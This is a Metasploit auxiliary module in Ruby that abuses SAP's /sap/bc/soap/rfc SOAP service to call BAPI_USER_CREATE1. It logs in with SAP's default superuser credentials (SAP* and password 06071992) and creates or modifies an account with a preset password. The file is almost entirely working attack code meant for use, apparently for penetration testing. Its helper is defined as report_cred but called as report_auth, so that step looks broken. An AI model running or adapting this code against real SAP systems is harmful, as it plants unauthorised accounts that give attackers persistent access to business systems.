##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy. I'd also like to thank Chris John Riley,
# Ian de Villiers and Joris van de Vis who have Beta tested the modules and
# provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation',
      'Description' => %q{
          This module makes use of the BAPI_USER_CREATE1 function, through the SOAP
        /sap/bc/soap/rfc service, for creating/modifying users on a SAP.
      },
      'References' =>
        [
          [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
        ],
      'Author' =>
        [
          'Agnivesh Sathasivam',
          'nmonkee'
        ],
      'License' => MSF_LICENSE
    )
    register_options([
      Opt::RPORT(8000),
      OptString.new('CLIENT', [true, 'SAP client', '001']),
      OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
      OptString.new('HttpPassword', [true, 'Password', '06071992']),
      OptString.new('BAPI_FIRST',[true,'First name','John']),
      OptString.new('BAPI_LAST',[true,'Last name','Doe']),
      OptString.new('BAPI_PASSWORD',[true,'Password for the account (Default is msf1234)','msf1234']),
      OptString.new('BAPI_USER',[true,'Username for the account (Username in upper case only. Default is MSF)', 'MSF'])
      ])
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(ip)
    data = '<?xml version="1.0" encoding="utf-8" ?>'
    data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
    data << '<env:Body>'
    data << '<n1:BAPI_USER_CREATE1 xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    data << '<ADDRESS>'
    data << '<FIRSTNAME>' + datastore['BAPI_FIRST'] + '</FIRSTNAME>'
    data << '<LASTNAME>' + datastore['BAPI_LAST'] + '</LASTNAME>'
    data << '</ADDRESS>'
    data << '<PASSWORD>'
    data << '<BAPIPWD>' + datastore['BAPI_PASSWORD'] + '</BAPIPWD>'
    data << '</PASSWORD>'
    data << '<USERNAME>' + datastore['BAPI_USER'] + '</USERNAME>'
    data << '</n1:BAPI_USER_CREATE1>'
    data << '</env:Body>'
    data << '</env:Envelope>'
    begin
      print_status("[SAP] #{ip}:#{rport} - Attempting to create user '#{datastore['BAPI_USER']}' with password '#{datastore['BAPI_PASSWORD']}'")

      res = send_request_cgi({
        'uri' => '/sap/bc/soap/rfc',
        'method' => 'POST',
        'data' => data,
        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
        'ctype' => 'text/xml; charset=UTF-8',
        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
        'headers' => {
          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
        },
        'encode_params' => false,
        'vars_get' => {
          'sap-client'    => datastore['CLIENT'],
          'sap-language'  => 'EN'
        }
      })
      if res and res.code == 200
        if res.body =~ /<h1>Logon failed<\/h1>/
          print_error("[SAP] #{ip}:#{rport} - Logon failed")
          return
        elsif res.body =~ /faultstring/
          error = []
          error.push(res.body.scan(%r{<faultstring>(.*?)</faultstring>}))
          print_error("[SAP] #{ip}:#{rport} - #{error.join().chomp}")
          return
        else
          print_good("[SAP] #{ip}:#{rport} - User '#{datastore['BAPI_USER']}' with password '#{datastore['BAPI_PASSWORD']}' created")
          report_auth(
            ip: ip,
            port: rport,
            service_name: 'sap',
            user: datastore['BAPI_USER'],
            password: datastore['BAPI_PASSWORD'],
            proof: res.body
          )
          return
        end
      else
        print_error("[SAP] #{ip}:#{rport} - Unknown Error")
        if res
          print_error("[SAP] #{ip}:#{rport} - Error code: #{res.code}")
          print_error("[SAP] #{ip}:#{rport} - Error message: #{res.message}")
        end
        return
      end
    rescue ::Rex::ConnectionError
      print_error("[SAP] #{ip}:#{rport} - Unable to connect")
      return
    end
  end
end
